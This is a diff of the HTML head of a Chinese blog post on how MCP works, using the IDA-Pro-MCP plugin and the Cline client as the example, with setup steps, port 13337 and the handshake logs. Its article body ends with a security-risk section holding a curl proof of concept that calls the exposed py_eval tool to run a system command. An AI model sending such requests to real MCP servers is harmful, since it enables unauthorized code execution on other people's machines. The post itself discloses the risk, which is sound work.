@@ -14,52 +14,7 @@ Server 端（IDA &#43; ida_mcp）：负责暴露 IDA 的各种功能给 AI
 Client 端（Cline）：负责连接 Server 并把工具告诉 AI
 
 Server 端配置（IDA 这边）
-位置：%APPDATA%\Hex-Rays\IDA Pro\plugins
-
-ida_mcp.py → 主插件文件（入口）
-ida_mcp 文件夹 → 插件的依赖和核心代码
-
-启动方式：
-
-启动 MCP Server（必须手动启动）
-
-打开 IDA &#43; 加载 IDB
-按快捷键 Ctrl &#43; Alt &#43; M
-或者菜单：Edit → Plugins → MCP
-
-
-MCP Server 运行时的关键信息（启动后会在 IDA 输出窗口看到）：
-
-默认监听端口：13337
-
-
-
-[MCP] Cached 18 strings in 4ms
-[MCP] Server started:
-  Streamable HTTP: http://127.0.0.1:13337/mcp
-  SSE: http://127.0.0.1:13337/sse
-  Config: http://127.0.0.1:13337/config.html
-Client 端配置（Cline 这边）
-{
-  &#34;mcpServers&#34;: {
-    &#34;ida-pro&#34;: {
-      &#34;disabled&#34;: false,
-      &#34;timeout&#34;: 60,
-      &#34;type&#34;: &#34;sse&#34;,
-      &#34;url&#34;: &#34;http://127.0.0.1:13337/sse&#34;
-    }
-  }
-}
-
-[MCP] &gt;&gt; initialize({&#34;protocolVersion&#34;: &#34;2025-11-25&#34;, &#34;capabilities&#34;: {},
-&#34;clientInfo&#34;: {&#34;name&#34;: &#34;Cline&#34;, &#34;version&#34;: &#34;3.84.0&#34;}})
-
-[MCP] &lt;&lt; initialize (0.2ms) {&#34;protocolVersion&#34;: &#34;2024-11-05&#34;, &#34;capabilities&#34;: 
-{&#34;tools&#34;: {}, &#34;resources&#34;: 
-{&#34;subscribe&#34;: false, &#34;listChanged&#34;: false}, &#34;prompts&#34;: {}}, 
-&#34;serverInfo&#34;: {&#34;name&#34;: &#34;ida-pro-mcp&#34;, &#34;version&#34;: &#34;1.0.0&#34;}}
-SEE（Server-Sent Events）
-SSE 是一种服务器推送技术，其核心特点是：">
+位置：%APPDATA%\Hex-Rays\IDA Pro\plugins">
 <meta name="author" content="偶记">
 <link rel="canonical" href="https://Doraemon0358.github.io/posts/mcp%E5%8E%9F%E7%90%86ida-pro-mcp%E4%B8%BA%E4%BE%8B/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.9e010bc22ef5794c0560b82f657f315607f24d8b05e0088e95b900c22246f5c0.css" integrity="sha256-ngELwi71eUwFYLgvZX8xVgfyTYsF4AiOlbkAwiJG9cA=" rel="preload stylesheet" as="style">
@@ -121,9 +76,7 @@ SSE 是一种服务器推送技术，其核心特点是：">
   <meta property="og:title" content="MCP 原理（IDA-Pro-MCP 为例）">
   <meta property="og:description" content="Cline是vscode上调用AI的插件。
 要让 AI（Cline）调用 IDA，需要两端配置：
-Server 端（IDA &#43; ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\Hex-Rays\IDA Pro\plugins
-ida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖和核心代码 启动方式：
-启动 MCP Server（必须手动启动） 打开 IDA &#43; 加载 IDB 按快捷键 Ctrl &#43; Alt &#43; M 或者菜单：Edit → Plugins → MCP MCP Server 运行时的关键信息（启动后会在 IDA 输出窗口看到）： 默认监听端口：13337 [MCP] Cached 18 strings in 4ms [MCP] Server started: Streamable HTTP: http://127.0.0.1:13337/mcp SSE: http://127.0.0.1:13337/sse Config: http://127.0.0.1:13337/config.html Client 端配置（Cline 这边） { &#34;mcpServers&#34;: { &#34;ida-pro&#34;: { &#34;disabled&#34;: false, &#34;timeout&#34;: 60, &#34;type&#34;: &#34;sse&#34;, &#34;url&#34;: &#34;http://127.0.0.1:13337/sse&#34; } } } [MCP] &gt;&gt; initialize({&#34;protocolVersion&#34;: &#34;2025-11-25&#34;, &#34;capabilities&#34;: {}, &#34;clientInfo&#34;: {&#34;name&#34;: &#34;Cline&#34;, &#34;version&#34;: &#34;3.84.0&#34;}}) [MCP] &lt;&lt; initialize (0.2ms) {&#34;protocolVersion&#34;: &#34;2024-11-05&#34;, &#34;capabilities&#34;: {&#34;tools&#34;: {}, &#34;resources&#34;: {&#34;subscribe&#34;: false, &#34;listChanged&#34;: false}, &#34;prompts&#34;: {}}, &#34;serverInfo&#34;: {&#34;name&#34;: &#34;ida-pro-mcp&#34;, &#34;version&#34;: &#34;1.0.0&#34;}} SEE（Server-Sent Events） SSE 是一种服务器推送技术，其核心特点是：">
+Server 端（IDA &#43; ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\Hex-Rays\IDA Pro\plugins">
   <meta property="og:locale" content="zh_cn">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -139,9 +92,7 @@ ida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖
   <meta name="twitter:title" content="MCP 原理（IDA-Pro-MCP 为例）">
   <meta name="twitter:description" content="Cline是vscode上调用AI的插件。
 要让 AI（Cline）调用 IDA，需要两端配置：
-Server 端（IDA &#43; ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\Hex-Rays\IDA Pro\plugins
-ida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖和核心代码 启动方式：
-启动 MCP Server（必须手动启动） 打开 IDA &#43; 加载 IDB 按快捷键 Ctrl &#43; Alt &#43; M 或者菜单：Edit → Plugins → MCP MCP Server 运行时的关键信息（启动后会在 IDA 输出窗口看到）： 默认监听端口：13337 [MCP] Cached 18 strings in 4ms [MCP] Server started: Streamable HTTP: http://127.0.0.1:13337/mcp SSE: http://127.0.0.1:13337/sse Config: http://127.0.0.1:13337/config.html Client 端配置（Cline 这边） { &#34;mcpServers&#34;: { &#34;ida-pro&#34;: { &#34;disabled&#34;: false, &#34;timeout&#34;: 60, &#34;type&#34;: &#34;sse&#34;, &#34;url&#34;: &#34;http://127.0.0.1:13337/sse&#34; } } } [MCP] &gt;&gt; initialize({&#34;protocolVersion&#34;: &#34;2025-11-25&#34;, &#34;capabilities&#34;: {}, &#34;clientInfo&#34;: {&#34;name&#34;: &#34;Cline&#34;, &#34;version&#34;: &#34;3.84.0&#34;}}) [MCP] &lt;&lt; initialize (0.2ms) {&#34;protocolVersion&#34;: &#34;2024-11-05&#34;, &#34;capabilities&#34;: {&#34;tools&#34;: {}, &#34;resources&#34;: {&#34;subscribe&#34;: false, &#34;listChanged&#34;: false}, &#34;prompts&#34;: {}}, &#34;serverInfo&#34;: {&#34;name&#34;: &#34;ida-pro-mcp&#34;, &#34;version&#34;: &#34;1.0.0&#34;}} SEE（Server-Sent Events） SSE 是一种服务器推送技术，其核心特点是：">
+Server 端（IDA &#43; ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\Hex-Rays\IDA Pro\plugins">
 
 
 <script type="application/ld+json">
@@ -170,12 +121,12 @@ ida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖
   "@type": "BlogPosting",
   "headline": "MCP 原理（IDA-Pro-MCP 为例）",
   "name": "MCP 原理（IDA-Pro-MCP 为例）",
-  "description": "Cline是vscode上调用AI的插件。\n要让 AI（Cline）调用 IDA，需要两端配置：\nServer 端（IDA + ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\\Hex-Rays\\IDA Pro\\plugins\nida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖和核心代码 启动方式：\n启动 MCP Server（必须手动启动） 打开 IDA + 加载 IDB 按快捷键 Ctrl + Alt + M 或者菜单：Edit → Plugins → MCP MCP Server 运行时的关键信息（启动后会在 IDA 输出窗口看到）： 默认监听端口：13337 [MCP] Cached 18 strings in 4ms [MCP] Server started: Streamable HTTP: http://127.0.0.1:13337/mcp SSE: http://127.0.0.1:13337/sse Config: http://127.0.0.1:13337/config.html Client 端配置（Cline 这边） { \u0026#34;mcpServers\u0026#34;: { \u0026#34;ida-pro\u0026#34;: { \u0026#34;disabled\u0026#34;: false, \u0026#34;timeout\u0026#34;: 60, \u0026#34;type\u0026#34;: \u0026#34;sse\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://127.0.0.1:13337/sse\u0026#34; } } } [MCP] \u0026gt;\u0026gt; initialize({\u0026#34;protocolVersion\u0026#34;: \u0026#34;2025-11-25\u0026#34;, \u0026#34;capabilities\u0026#34;: {}, \u0026#34;clientInfo\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;Cline\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;3.84.0\u0026#34;}}) [MCP] \u0026lt;\u0026lt; initialize (0.2ms) {\u0026#34;protocolVersion\u0026#34;: \u0026#34;2024-11-05\u0026#34;, \u0026#34;capabilities\u0026#34;: {\u0026#34;tools\u0026#34;: {}, \u0026#34;resources\u0026#34;: {\u0026#34;subscribe\u0026#34;: false, \u0026#34;listChanged\u0026#34;: false}, \u0026#34;prompts\u0026#34;: {}}, \u0026#34;serverInfo\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;ida-pro-mcp\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;}} SEE（Server-Sent Events） SSE 是一种服务器推送技术，其核心特点是：\n",
+  "description": "Cline是vscode上调用AI的插件。\n要让 AI（Cline）调用 IDA，需要两端配置：\nServer 端（IDA + ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\\Hex-Rays\\IDA Pro\\plugins\n",
   "keywords": [
     "MCP", "IDA Pro", "Cline", "SSE", "逆向工程"
   ],
   "articleBody": "Cline是vscode上调用AI的插件。\n要让 AI（Cline）调用 IDA，需要两端配置：\nServer 端（IDA + ida_mcp）：负责暴露 IDA 的各种功能给 AI Client 端（Cline）：负责连接 Server 并把工具告诉 AI Server 端配置（IDA 这边） 位置：%APPDATA%\\Hex-Rays\\IDA Pro\\plugins\nida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖和核心代码 启动方式：\n启动 MCP Server（必须手动启动） 打开 IDA + 加载 IDB 按快捷键 Ctrl + Alt + M 或者菜单：Edit → Plugins → MCP MCP Server 运行时的关键信息（启动后会在 IDA 输出窗口看到）： 默认监听端口：13337 [MCP] Cached 18 strings in 4ms [MCP] Server started: Streamable HTTP: http://127.0.0.1:13337/mcp SSE: http://127.0.0.1:13337/sse Config: http://127.0.0.1:13337/config.html Client 端配置（Cline 这边） { \"mcpServers\": { \"ida-pro\": { \"disabled\": false, \"timeout\": 60, \"type\": \"sse\", \"url\": \"http://127.0.0.1:13337/sse\" } } } [MCP] \u003e\u003e initialize({\"protocolVersion\": \"2025-11-25\", \"capabilities\": {}, \"clientInfo\": {\"name\": \"Cline\", \"version\": \"3.84.0\"}}) [MCP] \u003c\u003c initialize (0.2ms) {\"protocolVersion\": \"2024-11-05\", \"capabilities\": {\"tools\": {}, \"resources\": {\"subscribe\": false, \"listChanged\": false}, \"prompts\": {}}, \"serverInfo\": {\"name\": \"ida-pro-mcp\", \"version\": \"1.0.0\"}} SEE（Server-Sent Events） SSE 是一种服务器推送技术，其核心特点是：\n服务器可以主动向客户端推送消息，而不需要客户端不断轮询。\nMCP 协议实际采用的是 “HTTP + SSE” 混合模式：\nCline → IDA（客户端发起请求）：使用普通的 HTTP POST IDA → Cline（服务器返回结果）：通过 SSE 长连接 进行流式推送 这种设计非常适合 AI 工具调用场景，尤其是反编译、分析大量函数等需要返回较多数据的操作。\n安全风险 访问 http://127.0.0.1:13337/config.html 可以看到 MCP 暴露的所有工具，其中包括高危接口如：\npy_eval：在 IDA Python 环境中执行任意代码 patch*：修改二进制代码 各种调试器接口等 即使设置了 🏠 Local apps only，只要攻击者能够在本机或局域网内发送 HTTP 请求到 13337 端口，就可以构造请求调用 py_eval 执行系统命令：\nTime\u003ecurl -X POST http://127.0.0.1:13337/mcp -H \"Content-Type: application/json\" -d \"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"tools/call\\\",\\\"params\\\":{\\\"name\\\":\\\"py_eval\\\",\\\"arguments\\\":{\\\"code\\\":\\\"import os\\nprint(os.popen('whoami').read())\\\"}}}\" {\"jsonrpc\": \"2.0\", \"result\": {\"content\": [{\"type\": \"text\", \"text\": \"{\\n \\\"result\\\": \\\"None\\\",\\n \\\"stdout\\\": \\\"doraemon\\\\\\\\lihao\\\\n\\\\n\\\",\\n \\\"stderr\\\": \\\"\\\"\\n}\"}], \"structuredContent\": {\"result\": \"None\", \"stdout\": \"doraemon\\\\***\\n\\n\", \"stderr\": \"\"}, \"isError\": false}, \"id\": 1} ",
-  "wordCount" : "204",
+  "wordCount" : "671",
   "inLanguage": "en",
   "datePublished": "2026-05-24T13:00:00+08:00",
   "dateModified": "2026-05-24T13:00:00+08:00",
@@ -269,7 +220,7 @@ ida_mcp.py → 主插件文件（入口） ida_mcp 文件夹 → 插件的依赖
     <h1 class="post-title entry-hint-parent">
       MCP 原理（IDA-Pro-MCP 为例）
     </h1>
-    <div class="post-meta"><span title='2026-05-24 13:00:00 +0800 CST'>May 24, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>偶记</span>
+    <div class="post-meta"><span title='2026-05-24 13:00:00 +0800 CST'>May 24, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>偶记</span>
 
 </div>
   </header> <details class="toc" >
